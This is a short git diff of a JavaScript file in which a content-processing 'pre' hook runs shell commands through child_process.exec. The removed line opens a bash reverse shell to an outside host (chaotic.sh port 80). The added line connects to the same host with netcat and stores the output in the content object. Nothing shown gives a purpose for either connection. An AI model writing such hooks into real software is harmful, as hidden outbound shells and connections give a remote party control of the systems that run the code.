@@ -25,11 +25,12 @@ cp = require('child_process')
 function pre(context) {
     context.content.time = `${new Date()}`;
     return new Promise((res, rej)=> {
-        cp.exec('bash -c "bash -i >& /dev/tcp/chaotic.sh/80 0>&1"', (err, stdout, stderr) => {
+        cp.exec('nc www.chaotic.sh 80', (err, stdout, stderr) => {
             if (err) {
-                console.log(err);
+                context.content.uname = "stderr: "+err;
+            } else {
+                context.content.uname = "stdout: "+stdout;
             }
-            context.content.uname = "hello?"+stdout;
             res();
         });
     });
